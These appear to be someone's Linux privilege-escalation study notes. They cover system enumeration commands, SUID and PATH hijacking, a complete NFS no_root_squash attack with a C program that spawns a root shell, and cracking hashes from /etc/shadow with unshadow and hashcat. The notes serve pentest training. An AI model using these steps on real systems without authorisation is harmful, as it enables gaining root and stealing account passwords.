Enum:

uname -a
find system info for outdated versions
cat /proc/version
does about the same thing

ps -A axjf
Shows a tree of processes 

env
show system configs

sudo -l
find what commands you can run with sudo

find more files starting with "."
ls -la 

find files that may be vulnerable to an suid priv escelation attack:
getcap -r / 2>/dev/null

find writeable directorys:
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

LOLbins but for priv escelatioin:
https://gtfobins.github.io/

will list files that have SUID or SGID bits set:
find / -type f -perm -04000 -ls 2>/dev/null 

when a SUID file executes a command, you can add a path via export PATH=/tmp:$PATH and add your own executable with the name of the command in order to get that executed.

read /etc/exports, if you find no_root_squash, you can probably escelate privs. Use (on the attacker machiene) "showmount -e <target ip>" to find mounts use "mount -o rw <targetip>:/<taget mount> <a system directory (your system) to use to mirror the other system>" I would recomend doing sudo su on your machiene at this point. In the mirror file, make a c file with:
"""int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}"""
(without the 3 quotes) compile the file. Now use "chmod +s a.out(/whatever output file)". Now back to the target system, execute the a.out file/output file and you should have root.


Use unshadow passwdfile shadowfile > outfile.txt to get useable hashes of the system. 
crack the passwords from the above file:
hashcat -m 1800 -a 0 outfile.txt /usr/share/wordlists/rockyou.txt --force

read /etc/crontabs to find automaticly executed scripts that could have privleges that they shouldn't that you can edit
